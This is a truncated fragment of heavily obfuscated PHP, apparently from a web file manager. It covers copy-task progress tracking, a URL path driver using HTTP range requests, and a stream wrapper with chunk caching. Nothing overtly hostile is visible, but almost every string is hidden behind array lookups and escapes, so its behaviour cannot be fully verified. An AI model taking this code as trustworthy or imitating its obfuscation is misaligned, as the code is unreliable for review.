$åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1681]] = 0; if (!$åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1528]]) { $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1528]] = LNG($ú˜’ƒ∂Ã[1682]); } } protected function endAfter() { $æÀÑô©æ =& $_SERVER[ëæªã÷]; Hook::unbind($æÀÑô©æ[1656], array($this, $æÀÑô©æ[1657])); Hook::unbind($æÀÑô©æ[1189], array($this, $æÀÑô©æ[1658])); Hook::unbind($æÀÑô©æ[1659], array($this, $æÀÑô©æ[1660])); Hook::unbind($æÀÑô©æ[598], array($this, $æÀÑô©æ[1661])); Hook::unbind($æÀÑô©æ[599], array($this, $æÀÑô©æ[1662])); Hook::unbind($æÀÑô©æ[601], array($this, $æÀÑô©æ[1663])); Hook::unbind($æÀÑô©æ[602], array($this, $æÀÑô©æ[1663])); Hook::unbind($æÀÑô©æ[568], array($this, $æÀÑô©æ[1664])); Hook::unbind($æÀÑô©æ[565], array($this, $æÀÑô©æ[1664])); Hook::unbind($æÀÑô©æ[570], array($this, $æÀÑô©æ[1664])); Hook::unbind($æÀÑô©æ[572], array($this, $æÀÑô©æ[1664])); Hook::unbind($æÀÑô©æ[574], array($this, $æÀÑô©æ[1664])); Hook::unbind($æÀÑô©æ[1665], array($this, $æÀÑô©æ[1666])); Hook::unbind($æÀÑô©æ[591], array($this, $æÀÑô©æ[1667])); Hook::unbind($æÀÑô©æ[1668], array($this, $æÀÑô©æ[1669])); Hook::unbind($æÀÑô©æ[1670], array($this, $æÀÑô©æ[1671])); Hook::unbind($æÀÑô©æ[1672], array($this, $æÀÑô©æ[1673])); } public function copyMoveStart($˜•ı€´˝, $˙ŒéäÑ◊, $ú ÛÔÙ¥, $√™°ñº÷) { $¬ÂÖ◊Ç˘ =& $_SERVER[ëæªã÷]; self::log($¬ÂÖ◊Ç˘[1683] . $˙ŒéäÑ◊ . $¬ÂÖ◊Ç˘[80] . $√™°ñº÷); $–ê¶…¸ = rtrim(TEMP_FILES, $¬ÂÖ◊Ç˘[8]); if (substr($˙ŒéäÑ◊, 0, strlen($–ê¶…¸)) == $–ê¶…¸) { return; } if (substr($√™°ñº÷, 0, strlen($–ê¶…¸)) == $–ê¶…¸) { return; } $œ©®Ó∞ª =& $this->task; $œ©®Ó∞ª[$¬ÂÖ◊Ç˘[1684]] = KodIO::transferType($˜•ı€´˝, $ú ÛÔÙ¥); $this->update(); } public function updateAfter() { $¸ÉÑ›ˆ– =& $_SERVER[ëæªã÷]; $´¶ÙŸ¶Ω =& $this->task; if (!$´¶ÙŸ¶Ω[$¸ÉÑ›ˆ–[743]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($´¶ÙŸ¶Ω[$¸ÉÑ›ˆ–[1684]] == $¸ÉÑ›ˆ–[1278]) { return; } self::updateTask($´¶ÙŸ¶Ω); } private static function updateTask(&$™îíéﬁ±) { $Ø∞§¥Î’ =& $_SERVER[ëæªã÷]; if ($™îíéﬁ±[$Ø∞§¥Î’[1684]] == $Ø∞§¥Î’[1173] || $™îíéﬁ±[$Ø∞§¥Î’[1684]] == $Ø∞§¥Î’[118]) { if ($™îíéﬁ±[$Ø∞§¥Î’[1678]]) { $™îíéﬁ±[$Ø∞§¥Î’[1681]] = $™îíéﬁ±[$Ø∞§¥Î’[1680]] + $™îíéﬁ±[$Ø∞§¥Î’[1677]]; } } else { if ($™îíéﬁ±[$Ø∞§¥Î’[1684]] == $Ø∞§¥Î’[1279]) { if ($™îíéﬁ±[$Ø∞§¥Î’[1678]] == $Ø∞§¥Î’[1173]) { $™îíéﬁ±[$Ø∞§¥Î’[1681]] = $™îíéﬁ±[$Ø∞§¥Î’[1680]] + $™îíéﬁ±[$Ø∞§¥Î’[1677]] * 0.5; } else { if ($™îíéﬁ±[$Ø∞§¥Î’[1678]] == $Ø∞§¥Î’[118]) { $™îíéﬁ±[$Ø∞§¥Î’[1681]] = $™îíéﬁ±[$Ø∞§¥Î’[1680]] + $™îíéﬁ±[$Ø∞§¥Î’[1676]] * 0.5 + $™îíéﬁ±[$Ø∞§¥Î’[1677]] * 0.5; } } } } $™îíéﬁ±[$Ø∞§¥Î’[1630]] = $™îíéﬁ±[$Ø∞§¥Î’[1681]] / $™îíéﬁ±[$Ø∞§¥Î’[743]]; if ($™îíéﬁ±[$Ø∞§¥Î’[1630]] > 0) { $Ìˆ∞À¡ø = timeFloat() - $™îíéﬁ±[$Ø∞§¥Î’[1632]] - $™îíéﬁ±[$Ø∞§¥Î’[1635]]; $™îíéﬁ±[$Ø∞§¥Î’[1636]] = $Ìˆ∞À¡ø * (1 - $™îíéﬁ±[$Ø∞§¥Î’[1630]]) / $™îíéﬁ±[$Ø∞§¥Î’[1630]]; } } public function addPath($·≈´£á«) { $Ë“‘èîü =& $_SERVER[ëæªã÷]; if (!$·≈´£á«) { return; } $∂¬∂¿â =& $this->task; $Á’¸Ó¯¯ = IO::infoWithChildren($·≈´£á«); $∆ÚêÍﬂ¸ = $∂¬∂¿â[$Ë“‘èîü[1685]] ? $∂¬∂¿â[$Ë“‘èîü[1685]][$Ë“‘èîü[1686]] : 0; $∂¬∂¿â[$Ë“‘èîü[1685]] = array($Ë“‘èîü[1686] => $∆ÚêÍﬂ¸ + 1, $Ë“‘èîü[421] => $Á’¸Ó¯¯[$Ë“‘èîü[32]], $Ë“‘èîü[88] => $Á’¸Ó¯¯[$Ë“‘èîü[88]], $Ë“‘èîü[519] => $Á’¸Ó¯¯[$Ë“‘èîü[519]] ? $Á’¸Ó¯¯[$Ë“‘èîü[519]] : $Á’¸Ó¯¯[$Ë“‘èîü[88]]); if ($Á’¸Ó¯¯[$Ë“‘èîü[33]] == $Ë“‘èîü[202]) { $∂¬∂¿â[$Ë“‘èîü[766]] += 1; } else { $∂¬∂¿â[$Ë“‘èîü[766]] += $Á’¸Ó¯¯[$Ë“‘èîü[93]][$Ë“‘èîü[91]]; if ($Á’¸Ó¯¯[$Ë“‘èîü[403]]) { $∂¬∂¿â[$Ë“‘èîü[766]] += $Á’¸Ó¯¯[$Ë“‘èîü[93]][$Ë“‘èîü[92]] + 1; } } $∂¬∂¿â[$Ë“‘èîü[743]] += $Á’¸Ó¯¯[$Ë“‘èîü[90]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($∞’èÔ≈«) { $ﬂ˙Ñ≈´˛ =& $_SERVER[ëæªã÷]; $†¶Â«Ô¬ =& $this->task; $†¶Â«Ô¬[$ﬂ˙Ñ≈´˛[1674]] = $∞’èÔ≈«[$ﬂ˙Ñ≈´˛[32]]; $†¶Â«Ô¬[$ﬂ˙Ñ≈´˛[1040]] = $∞’èÔ≈«[$ﬂ˙Ñ≈´˛[32]]; $this->update(); } public function copyFileStart($Üù≤ˆ¥, $Ú§∏Éﬂü, $Ö£—“ÁË, $äœΩú¿¡, $±îê Ü˜, $Ø‘ƒŸâÎ) { $ÍØ≤≤Õ∂ =& $_SERVER[ëæªã÷]; $…⁄È‰Ë« = $±îê Ü˜; if ($…⁄È‰Ë« == $GLOBALS[$ÍØ≤≤Õ∂[1687]]) { $…⁄È‰Ë« = $GLOBALS[$ÍØ≤≤Õ∂[1688]]; } $GLOBALS[$ÍØ≤≤Õ∂[1688]] = $±îê Ü˜; $GLOBALS[$ÍØ≤≤Õ∂[1687]] = $Ø‘ƒŸâÎ; $ÂÅœ§¸≠ =& $this->task; $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1674]] = $…⁄È‰Ë«; $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1676]] = (int) $Üù≤ˆ¥->size($Ú§∏Éﬂü); $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1677]] = 0; $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1040]] = $ÍØ≤≤Õ∂[12]; $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1678]] = $ÍØ≤≤Õ∂[12]; $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1679]] = 0; $è¢øÇÂ§ = $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1676]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÂÅœ§¸≠[$ÍØ≤≤Õ∂[401]] . $ÍØ≤≤Õ∂[1689]); if ($è¢øÇÂ§ && file_exists(get_path_father($äœΩú¿¡))) { Cache::set($ÂÅœ§¸≠[$ÍØ≤≤Õ∂[401]] . $ÍØ≤≤Õ∂[1689], $äœΩú¿¡); $ÂÅœ§¸≠[$ÍØ≤≤Õ∂[1650]] = array($ÍØ≤≤Õ∂[1690], $ÍØ≤≤Õ∂[1691]); } $this->update(0, $è¢øÇÂ§); } public static function updateCopyLocalFileSize($ˆú”¯∞ç) { $ööéÂÛ¿ =& $_SERVER[ëæªã÷]; $∞ÑÕΩÄπ = Cache::get($ˆú”¯∞ç[$ööéÂÛ¿[401]] . $ööéÂÛ¿[1689]); if (!$∞ÑÕΩÄπ || !file_exists($∞ÑÕΩÄπ)) { return $ˆú”¯∞ç; } $ˆú”¯∞ç[$ööéÂÛ¿[1677]] = @filesize($∞ÑÕΩÄπ); $ˆú”¯∞ç[$ööéÂÛ¿[1681]] += $ˆú”¯∞ç[$ööéÂÛ¿[1677]]; self::updateTask($ˆú”¯∞ç); return $ˆú”¯∞ç; } public function copyFileEnd($∑…∂Õ–Î, $™öú∞Ûµ, $≈‰ÙÄ√Ø, $Ï◊à§õ‘, $÷ …Ô≠Ô, $õ˙∞ÏÒ) { $Ú®Ò°ñ‡ =& $_SERVER[ëæªã÷]; $Ï¯Ã≤ˆ“ =& $this->task; $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1677]] = $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1676]]; $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1678]] = $Ú®Ò°ñ‡[12]; unset($Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1650]]); if ($÷ …Ô≠Ô == $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1674]]) { $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1680]] += $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1676]]; $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1681]] = $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1680]]; $this->update(1); } else { $this->update(); $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1677]] = 0; } Cache::remove($Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[401]] . $Ú®Ò°ñ‡[1689]); self::log($Ú®Ò°ñ‡[1692] . $™öú∞Ûµ . $Ú®Ò°ñ‡[80] . $Ï◊à§õ‘ . $Ú®Ò°ñ‡[65] . $÷ …Ô≠Ô . $Ú®Ò°ñ‡[1693] . $Ï¯Ã≤ˆ“[$Ú®Ò°ñ‡[1674]]); } public function updateFileEnd($ÃË·ªÄ™, $≠Ò¿Ó‰¨) { $‘˛Â–Ω‹ =& $_SERVER[ëæªã÷]; $–√˚Ê¶ü =& $this->task; $–√˚Ê¶ü[$‘˛Â–Ω‹[1674]] = $ÃË·ªÄ™; $–√˚Ê¶ü[$‘˛Â–Ω‹[1676]] = $≠Ò¿Ó‰¨; $–√˚Ê¶ü[$‘˛Â–Ω‹[1680]] += $≠Ò¿Ó‰¨; $–√˚Ê¶ü[$‘˛Â–Ω‹[1681]] = $–√˚Ê¶ü[$‘˛Â–Ω‹[1680]]; $this->update(1); self::log($‘˛Â–Ω‹[1694] . $ÃË·ªÄ™); } public function sourceModelCopy($üŒŒÜËø) { $¡–ÓâÇ∂ =& $_SERVER[ëæªã÷]; $œïÉÄ… = $üŒŒÜËø[0]; $∞øó»ÕÚ = $üŒŒÜËø[1]; $ÑΩçê‹Ó =& $this->task; $this->sourceModelCopyFlag = !0; $úï€˚‰¨ = 0; switch ($œïÉÄ…) { case $¡–ÓâÇ∂[566]: $úï€˚‰¨ = 1; break; case $¡–ÓâÇ∂[569]: $ÑΩçê‹Ó[$¡–ÓâÇ∂[1674]] = $∞øó»ÕÚ[$¡–ÓâÇ∂[32]]; break; case $¡–ÓâÇ∂[571]: $úï€˚‰¨ = intval($üŒŒÜËø[$¡–ÓâÇ∂[384]] * 0.4); break; case $¡–ÓâÇ∂[573]: $úï€˚‰¨ = intval($üŒŒÜËø[$¡–ÓâÇ∂[384]] * 0.2); break; case $¡–ÓâÇ∂[575]: $úï€˚‰¨ = intval($üŒŒÜËø[$¡–ÓâÇ∂[384]] * 0.4); break; } $this->update($úï€˚‰¨); $this->sourceModelCopyFlag = !1; } public function sourceRemove($˝ ⁄àï©, $ü˛Óö˝ÿ) { $Æ±÷Á£≤ =& $_SERVER[ëæªã÷]; $this->sourceModelCopyFlag = !0; $± ÑÑ¯” = 1; if (isset($˝ ⁄àï©[$Æ±÷Á£≤[93]])) { $± ÑÑ¯” = $˝ ⁄àï©[$Æ±÷Á£≤[93]][$Æ±÷Á£≤[91]] + $˝ ⁄àï©[$Æ±÷Á£≤[93]][$Æ±÷Á£≤[92]] + 1; } $this->update($± ÑÑ¯”); $this->sourceModelCopyFlag = !1; } public function sourceMove($“ı±Ï¨®) { $this->sourceRemove($“ı±Ï¨®, !1); } public function curlProgress($ö°áœáÚ, $ı˝äŸ™∞, $Ôı¢◊ÿ•, $Á¿àÚö∏, $ºïöàâ°) { $ﬁÿ¬ÁâŒ =& $_SERVER[ëæªã÷]; $âÚ∞éöº =& $this->task; if ($ºïöàâ° > 0) { $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1040]] = $ﬁÿ¬ÁâŒ[1695]; $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1678]] = $ﬁÿ¬ÁâŒ[118]; if ($âÚ∞éöº[$ﬁÿ¬ÁâŒ[1676]]) { $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1677]] = $ºïöàâ°; } if ($âÚ∞éöº[$ﬁÿ¬ÁâŒ[1679]]) { $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1677]] = $ºïöàâ° + $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1679]]; } } else { if ($Ôı¢◊ÿ• > 0) { if ($âÚ∞éöº[$ﬁÿ¬ÁâŒ[1676]] == $ı˝äŸ™∞) { $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1677]] = $Ôı¢◊ÿ•; $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1040]] = $ﬁÿ¬ÁâŒ[1696]; $âÚ∞éöº[$ﬁÿ¬ÁâŒ[1678]] = $ﬁÿ¬ÁâŒ[1173]; } } } $this->update(); } public function curlProgressStart($∏ÙÂ≠˜“) { } public function curlProgressEnd($ú≥≈ûêç) { $ëØÜå˙† =& $_SERVER[ëæªã÷]; $Ã•‹¬¥÷ =& $this->task; $ı ïå∏˜ = curl_getinfo($ú≥≈ûêç); $„‹É–†Ÿ = $ı ïå∏˜[$ëØÜå˙†[1697]]; if ($„‹É–†Ÿ == -1) { $„‹É–†Ÿ = $ı ïå∏˜[$ëØÜå˙†[1698]]; } if ($Ã•‹¬¥÷[$ëØÜå˙†[1678]] == $ëØÜå˙†[118] && $„‹É–†Ÿ) { $Ã•‹¬¥÷[$ëØÜå˙†[1679]] += $„‹É–†Ÿ; } $this->update(); } } goto AÑ£À∏Ç⁄Ö; FÃÎ™Ç£¥Ú: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ì‡®£æ“ = false) { } public function exist($ı≥πÊª◊) { $°„˜„´ª = $this->info($ı≥πÊª◊); return $°„˜„´ª[$_SERVER[ëæªã÷][204]]; } public function isFile($÷™ãÇ™∏) { $ï¡´Í÷‘ = $this->info($÷™ãÇ™∏); return $ï¡´Í÷‘[$_SERVER[ëæªã÷][204]]; } public function isFolder($∏≠“ÂÈ◊) { return !1; } public function size($´ß„ÇÉç) { $¢‡ì»äÁ = $this->info($´ß„ÇÉç); return $¢‡ì»äÁ[$_SERVER[ëæªã÷][90]]; } public function info($Åﬁ‡ƒ˝Ω) { return $this->infoParse($Åﬁ‡ƒ˝Ω); } public function infoAuth($¥∆Æãí´) { return $this->infoParse($¥∆Æãí´); } public function infoWithChildren($˚Çœ‘‚Õ) { return $this->infoParse($˚Çœ‘‚Õ); } public function infoFull($Ñ‘à◊Æ…) { return $this->infoParse($Ñ‘à◊Æ…); } private function infoParse($◊‹Ä˜ß˜) { $˝†–Ùµ =& $_SERVER[ëæªã÷]; $¬≠ì™üä = $this->header($◊‹Ä˜ß˜); if (!$¬≠ì™üä || !$¬≠ì™üä[$˝†–Ùµ[730]]) { return !1; } $ØÙ®Ó®ˆ = _get($¬≠ì™üä, $˝†–Ùµ[341], 0); $ò—î˙·Ÿ = array($˝†–Ùµ[32] => $¬≠ì™üä[$˝†–Ùµ[32]], $˝†–Ùµ[88] => $◊‹Ä˜ß˜, $˝†–Ùµ[33] => $˝†–Ùµ[202], $˝†–Ùµ[90] => intval($ØÙ®Ó®ˆ), $˝†–Ùµ[177] => get_path_ext($¬≠ì™üä[$˝†–Ùµ[32]]), $˝†–Ùµ[1352] => $ØÙ®Ó®ˆ > 0 && $¬≠ì™üä[$˝†–Ùµ[1474]], $˝†–Ùµ[1353] => !1); return $ò—î˙·Ÿ; } private function header($…«òÊ◊÷) { $‹Ó¯èô√ =& $_SERVER[ëæªã÷]; if (isset(self::$_cacheHeader[$…«òÊ◊÷])) { return self::$_cacheHeader[$…«òÊ◊÷]; } $·´Ûº˚ı = isset($GLOBALS[$‹Ó¯èô√[1475]]) ? $GLOBALS[$‹Ó¯èô√[1475]] : !1; $GLOBALS[$‹Ó¯èô√[1475]] = !0; self::$_cacheHeader[$…«òÊ◊÷] = url_header($…«òÊ◊÷); $GLOBALS[$‹Ó¯èô√[1475]] = $·´Ûº˚ı; return self::$_cacheHeader[$…«òÊ◊÷]; } public function hashSimple($‡ñªø‘ì, $ûÔóò‚„ = false) { $£¸¡à¶ì =& $_SERVER[ëæªã÷]; $øî¸±úü = $this->info($‡ñªø‘ì); if (!$øî¸±úü || !$øî¸±úü[$£¸¡à¶ì[204]]) { return !1; } $ÅßÑùñˆ = $øî¸±úü[$£¸¡à¶ì[90]]; $éíì¿´ù = 200; $Ä’Ç†¨Ï = 50; if ($ÅßÑùñˆ <= $éíì¿´ù * $Ä’Ç†¨Ï) { return md5($this->fileSubstr($‡ñªø‘ì, 0, $ÅßÑùñˆ)) . $ÅßÑùñˆ; } $ÚÆíä∂Ä = intval($ÅßÑùñˆ / $Ä’Ç†¨Ï); $ﬂò—˝ö∞ = $£¸¡à¶ì[12]; $ÏÑ•∫∏ˆ = timeFloat(); $ã◊ä÷óÂ = 15; for ($˘˚úßÏ˙ = 0; $˘˚úßÏ˙ < $Ä’Ç†¨Ï; $˘˚úßÏ˙++) { if (timeFloat() - $ÏÑ•∫∏ˆ > $ã◊ä÷óÂ) { return !1; } $∆¢ßâ≈å = $this->fileSubstr($‡ñªø‘ì, $ÚÆíä∂Ä * $˘˚úßÏ˙, $éíì¿´ù); if (!$∆¢ßâ≈å) { return !1; } $ﬂò—˝ö∞ .= $∆¢ßâ≈å; } $ﬂò—˝ö∞ .= $this->fileSubstr($‡ñªø‘ì, $ÅßÑùñˆ - $éíì¿´ù, $éíì¿´ù); return md5($ﬂò—˝ö∞) . $ÅßÑùñˆ; } public function getContent($·”‰å˛¿) { return $this->fileSubstr($·”‰å˛¿); } public function fileSubstr($¥ŸŸãÆ£, $À¢ãÂ†⁄ = 0, $»•æùÂ— = -1) { $“ﬁæ¿™€ =& $_SERVER[ëæªã÷]; $ﬁÜë“Ùß = $this->info($¥ŸŸãÆ£); if (!$ﬁÜë“Ùß || !$ﬁÜë“Ùß[$“ﬁæ¿™€[204]] && $ﬁÜë“Ùß[$“ﬁæ¿™€[90]] > 1024 * 1024 * 10) { return !1; } if ($»•æùÂ— === -1) { $»•æùÂ— = $ﬁÜë“Ùß[$“ﬁæ¿™€[90]]; } if ($»•æùÂ— == 0) { return $“ﬁæ¿™€[12]; } $“ÜΩ∑íó = array($“ﬁæ¿™€[1476] . $À¢ãÂ†⁄ . $“ﬁæ¿™€[762] . ($À¢ãÂ†⁄ + $»•æùÂ— - 1)); $ŸÂÚŒæï = url_request($¥ŸŸãÆ£, $“ﬁæ¿™€[235], !1, $“ÜΩ∑íó, !1, !1, 1); return $ŸÂÚŒæï[$“ﬁæ¿™€[1167]] ? $ŸÂÚŒæï[$“ﬁæ¿™€[1167]] : $“ﬁæ¿™€[12]; } public function download($ˆïÆÉ´˝, $ù™ÔÖÇ•) { Downloader::start($ˆïÆÉ´˝, $ù™ÔÖÇ•); return $ù™ÔÖÇ•; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($∫ëÌõÒ’, $®Ç®ê¡¯ = '') { $this->info = $this->info($∫ëÌõÒ’); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ëæªã÷][88]]; $this->pathOpen = $∫ëÌõÒ’; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$∫ëÌõÒ’])) { self::$_chunkBuffer[$∫ëÌõÒ’] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Û⁄«¢¥á) { $πòâ©Ú· = $this->fileSubstr($this->pose, $Û⁄«¢¥á); $this->pose += strlen($πòâ©Ú·); return $πòâ©Ú·; } public function stream_tell() { return $this->pose; } public function stream_seek($Ü°ÔáºÂ, $áπáô∏’) { $°˜˝ÙÎƒ =& $_SERVER[ëæªã÷]; if ($áπáô∏’ == SEEK_SET) { $this->pose = $Ü°ÔáºÂ; } else { if ($áπáô∏’ == SEEK_CUR) { $this->pose += $Ü°ÔáºÂ; } else { if ($áπáô∏’ == SEEK_END) { $this->pose = $this->info[$°˜˝ÙÎƒ[90]] + intval($Ü°ÔáºÂ); } } } if ($Ü°ÔáºÂ < 0) { $this->pose = $this->info[$°˜˝ÙÎƒ[90]] + $Ü°ÔáºÂ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ëæªã÷][90]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¡øÊ©·ü, $•ëøÄÌ ) { $∞ÎØ≠⁄¬ =& $_SERVER[ëæªã÷]; $ŸÕ«ç˘ì = $this->info($¡øÊ©·ü); return array($∞ÎØ≠⁄¬[1477] => 0, $∞ÎØ≠⁄¬[1478] => 0, $∞ÎØ≠⁄¬[16] => 32768 + 511, $∞ÎØ≠⁄¬[1479] => 0, $∞ÎØ≠⁄¬[1480] => 0, $∞ÎØ≠⁄¬[1481] => 0, $∞ÎØ≠⁄¬[1482] => 0, $∞ÎØ≠⁄¬[90] => $ŸÕ«ç˘ì[$∞ÎØ≠⁄¬[90]], $∞ÎØ≠⁄¬[1483] => $ŸÕ«ç˘ì[$∞ÎØ≠⁄¬[1351]], $∞ÎØ≠⁄¬[1439] => $ŸÕ«ç˘ì[$∞ÎØ≠⁄¬[96]], $∞ÎØ≠⁄¬[1438] => $ŸÕ«ç˘ì[$∞ÎØ≠⁄¬[203]], $∞ÎØ≠⁄¬[1484] => 0, $∞ÎØ≠⁄¬[1485] => 0); } static $fileInfo = array(); public function info($èä£è≠ã) { $›·õã…› = $_SERVER[ëæªã÷][1486]; if (isset(self::$fileInfo[$èä£è≠ã])) { return self::$fileInfo[$èä£è≠ã]; } if (substr($èä£è≠ã, 0, strlen($›·õã…›)) != $›·õã…›) { return !1; } self::$fileInfo[$èä£è≠ã] = IO::info(substr($èä£è≠ã, strlen($›·õã…›))); return self::$fileInfo[$èä£è≠ã]; } public static function read($˙º»ÂåÅ, $ºàæΩã¡, $È∏ëÀúØ) { if (!isset(self::$_fopenCache[$˙º»ÂåÅ])) { $·¢µÕ√å = new StreamWrapperIO(); $·¢µÕ√å->stream_open($˙º»ÂåÅ); self::$_fopenCache[$˙º»ÂåÅ] = $·¢µÕ√å; } $·¢µÕ√å = self::$_fopenCache[$˙º»ÂåÅ]; return $·¢µÕ√å->fileSubstr($ºàæΩã¡, $È∏ëÀúØ); } public static function _read($ «ñ≥«û, $”Æ∂ûÌƒ, $Ω§›÷πæ) { $¯ä‘õ’Ò =& $_SERVER[ëæªã÷]; $û∑œÖ±ò = fopen($ «ñ≥«û, $¯ä‘õ’Ò[1355]); if (!$û∑œÖ±ò) { return $¯ä‘õ’Ò[12]; } $‰†ﬁÓ£ò = 8192; fseek($û∑œÖ±ò, $”Æ∂ûÌƒ, SEEK_SET); $ƒ∞îÜ§ = $¯ä‘õ’Ò[12]; $Çö∑Ÿºæ = 0; while ($Çö∑Ÿºæ < $Ω§›÷πæ) { $ÇœúÇ–Ã = min($‰†ﬁÓ£ò, $Ω§›÷πæ - $Çö∑Ÿºæ); $ƒ∞îÜ§ .= fread($û∑œÖ±ò, $ÇœúÇ–Ã); $Çö∑Ÿºæ += $ÇœúÇ–Ã; } fclose($û∑œÖ±ò); return $ƒ∞îÜ§; } public function fileSubstr($óﬂ˚∞ßÆ, $…ÍÕú“÷) { $û¿ò√˜ó =& $_SERVER[ëæªã÷]; $˝≈«´éœ = $this->info[$û¿ò√˜ó[90]]; $≥°Í÷”® = $óﬂ˚∞ßÆ; $é∫ôæÖ· = $…ÍÕú“÷; if ($óﬂ˚∞ßÆ < 0) { $óﬂ˚∞ßÆ = $˝≈«´éœ + $óﬂ˚∞ßÆ; } if ($…ÍÕú“÷ === !1) { $…ÍÕú“÷ = $˝≈«´éœ - $óﬂ˚∞ßÆ; } if ($óﬂ˚∞ßÆ + $…ÍÕú“÷ > $˝≈«´éœ) { $…ÍÕú“÷ = $˝≈«´éœ - $óﬂ˚∞ßÆ; } if ($…ÍÕú“÷ <= 0) { return $û¿ò√˜ó[12]; } if ($óﬂ˚∞ßÆ < 0 || $óﬂ˚∞ßÆ >= $˝≈«´éœ || $…ÍÕú“÷ <= 0 || $…ÍÕú“÷ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\x6c\x65\x52\x65\141\x64\x20\145\162\x72\x6f\x72\41\x20\x73\x74\x61\162\x74\x3d{$óﬂ˚∞ßÆ}\73\x6c\x65\x6e\x67\x74\x68\75{$…ÍÕú“÷}\x3b\40\163\151\172\145\75{$˝≈«´éœ}\73"); } $Ÿâ«”ÈÚ = 64 * 1024; $›ÏÏ«ÔË =& self::$_chunkBuffer[$this->path]; if (!$›ÏÏ«ÔË) { $›ÏÏ«ÔË = array(); } $¸©ΩóÅ∑ = 0; $≠Ÿ¬∆æÉ = 0; $ŸÙ¿ß˝Á = $û¿ò√˜ó[12]; foreach ($›ÏÏ«ÔË as $¸©ΩóÅ∑ => $ŸÙ¿ß˝Á) { $¸©ΩóÅ∑ = intval($¸©ΩóÅ∑); $≠Ÿ¬∆æÉ = $¸©ΩóÅ∑ + strlen($ŸÙ¿ß˝Á); if ($óﬂ˚∞ßÆ >= $≠Ÿ¬∆æÉ) { continue; } if ($óﬂ˚∞ßÆ >= $¸©ΩóÅ∑ && $óﬂ˚∞ßÆ + $…ÍÕú“÷ <= $≠Ÿ¬∆æÉ) { return substr($ŸÙ¿ß˝Á, $óﬂ˚∞ßÆ - $¸©ΩóÅ∑, $…ÍÕú“÷); } break; } if (count($›ÏÏ«ÔË) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($û¿ò√˜ó[1487], $û¿ò√˜ó[1488] . count($›ÏÏ«ÔË) . "\x3b\x73\164\141\162\x74\75{$óﬂ˚∞ßÆ}\54\154\x65\156\x67\x74\x68\x3d{$…ÍÕú“÷}\73\160\x6f\163\145\x3a{$¸©ΩóÅ∑}\x7e{$≠Ÿ¬∆æÉ}"); throw new Exception($û¿ò√˜ó[1489]); } $ûüÀ∏è∏ = intval($óﬂ˚∞ßÆ / $Ÿâ«”ÈÚ) * $Ÿâ«”ÈÚ; $ñÉâÀ∫ê = ceil(($óﬂ˚∞ßÆ + $…ÍÕú“÷) / $Ÿâ«”ÈÚ) * $Ÿâ«”ÈÚ - $ûüÀ∏è∏; $Õ¶È‘˘ò = IO::fileSubstr($this->path, $ûüÀ∏è∏, $ñÉâÀ∫ê); $›ÏÏ«ÔË[$ûüÀ∏è∏ . $û¿ò√˜ó[12]] = $Õ¶È‘˘ò; ksort($›ÏÏ«ÔË); $ò ˜É€¥ = substr($Õ¶È‘˘ò, $óﬂ˚∞ßÆ - $ûüÀ∏è∏, $…ÍÕú“÷); return $ò ˜É€¥; } private function log($”òπà»‚, $¡©˝ÅÀª) { $í≈õ“ÅŸ =& $_SERVER[ëæªã÷]; $¬Ç”˘Ïƒ = timeFloat() - $this->timeStart; write_log(sprintf($í≈õ“ÅŸ[1490], $”òπà»‚, $this->info[$í≈õ“ÅŸ[32]], $¬Ç”˘Ïƒ, $¡©˝ÅÀª), $í≈õ“ÅŸ[1157]); } } class Message { function __construct() { } public function send($ÿ≈á¸Ó£ = '', $ˆê·°≤à = array(), $µÕœª†œ = "\164\145\170\x74") { $ÍŸÇøÌÆ =& $_SERVER[ëæªã÷]; $¨„ıòîÅ = array($ÍŸÇøÌÆ[33] => $ÍŸÇøÌÆ[1491], $ÍŸÇøÌÆ[735] => $ÿ≈á¸Ó£); if (in_array($µÕœª†œ, array($ÍŸÇøÌÆ[1491], $ÍŸÇøÌÆ[1492]))) { $¨„ıòîÅ[$ÍŸÇøÌÆ[33]] = $µÕœª†œ; } $ˆê·°≤à = array($ÍŸÇøÌÆ[515] => 